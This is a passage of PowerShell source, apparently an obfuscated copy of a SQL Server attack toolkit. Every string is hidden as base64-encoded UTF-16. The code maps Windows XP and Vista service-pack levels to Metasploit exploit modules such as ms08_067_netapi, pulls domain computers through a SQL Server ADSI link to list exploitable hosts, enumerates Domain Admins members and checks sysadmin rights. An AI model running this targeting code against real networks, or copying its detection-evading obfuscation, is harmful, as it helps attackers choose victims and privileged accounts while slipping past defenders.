        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADUAXwAwADMAOQBfAHAAbgBwAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADEAOQA4ADMA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADcAMABfAHcAawBzAHMAdgBjAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA5ADEA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        $TableVulnComputers = New-Object System.Data.DataTable 
        $TableVulnComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))) | Out-Null
        $TableVulnComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))) | Out-Null
        $TableVulnComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))) | Out-Null
        $TableVulnComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4A')))) | Out-Null
        $TableVulnComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBzAGYATQBvAGQAdQBsAGUA')))) | Out-Null  
        $TableVulnComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBWAEUA')))) | Out-Null
    }
    Process
    {
        if($UseAdHoc){
            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBDAG8AbQBwAHUAdABlAHIAKQA='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0ALABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQB2AGUAcgBzAGkAbwBuACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AcwBlAHIAdgBpAGMAZQBwAGEAYwBrACwAdwBoAGUAbgBjAGgAYQBuAGcAZQBkACwAbABvAGcAbwBuAGMAbwB1AG4AdAA='))) -UseAdHoc            
        }else{
            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBDAG8AbQBwAHUAdABlAHIAKQA='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0ALABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQB2AGUAcgBzAGkAbwBuACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AcwBlAHIAdgBpAGMAZQBwAGEAYwBrACwAdwBoAGUAbgBjAGgAYQBuAGcAZQBkACwAbABvAGcAbwBuAGMAbwB1AG4AdAA=')))            
        }
        $TableExploits | % {
            $ExploitOS = $_.OperatingSystem
            $ExploitSP = $_.ServicePack
            $ExploitMsf = $_.MsfModule
            $ExploitCve = $_.CVE
            $Result | % {
                $AdsHostname = $_.DNSHostName
                $AdsOS = $_.OperatingSystem
                $AdsSP = $_.OperatingSystemServicePack                                                      
                $AdsLast = $_.LastLogon
                if ($AdsOS -like "$ExploitOS*" -and $AdsSP -like "$ExploitSP" ){                    
                    $TableVulnComputers.Rows.Add($AdsHostname,$AdsOS,$AdsSP,[dateTime]::FromFileTime($AdsLast),$ExploitMsf,$ExploitCve) | Out-Null 
                }
            }
        }
        $TableVulnComputers | sort { $_.lastlogon -as [datetime]} -Descending  
    }
    End
    {               
    }
}
Function  Get-SQLDomainGroupMember
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain group to filter for.')]
        [string]$FilterGroup,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if((-not $FilterGroup)){
            $FilterGroup = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABBAGQAbQBpAG4AcwA=')))
        }
        $TableMembers = New-Object System.Data.DataTable
        $TableMembers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))) | Out-Null
        $TableMembers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBBAE0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA==')))) | Out-Null
        $TableMembers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))) | Out-Null
    }
    Process
    {
        if($UseAdHoc){
            $FullDN = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=group)(samaccountname=$FilterGroup))" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))) -UseAdHoc -SuppressVerbose
        }else{
            $FullDN = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=group)(samaccountname=$FilterGroup))" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))) -SuppressVerbose       
        }
        $DN = $FullDN.distinguishedname
        if($UseAdHoc){
            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=user)(memberOf=$DN))" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAcABsAGEAeQBuAGEAbQBlAA=='))) -UseAdHoc
        }else{
            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=user)(memberOf=$DN))" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAcABsAGEAeQBuAGEAbQBlAA==')))     
        }
        $Results | % {           
            $TableMembers.Rows.Add($FilterGroup,$_.samaccountname,$_.displayname) | Out-Null 
        }
        $TableMembers
    }
    End
    {               
    }
}
Function  Get-SQLSysadminCheck
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblSysadminStatus = New-Object -TypeName System.Data.DataTable
        if($CredentialName)
        {
            $CredentialNameFilter = " WHERE name like '$CredentialName'"
        }
        else
        {
            $CredentialNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $Query = "SELECT    '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            CASE
            WHEN IS_SRVROLEMEMBER('sysadmin') =  0 THEN 'No'
            ELSE 'Yes'
        END as IsSysadmin"
        $TblSysadminStatusTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $TblSysadminStatus = $TblSysadminStatus + $TblSysadminStatusTemp
    }
    End
    {
        $TblSysadminStatus
    }
}
Function  Get-SQLLocalAdminCheck
{
    Begin
    {
    }
    Process
    {
        $WinCurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $WinCurrentUserName = $WinCurrentUser.name
        $WinGroups = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($WinCurrentUser)
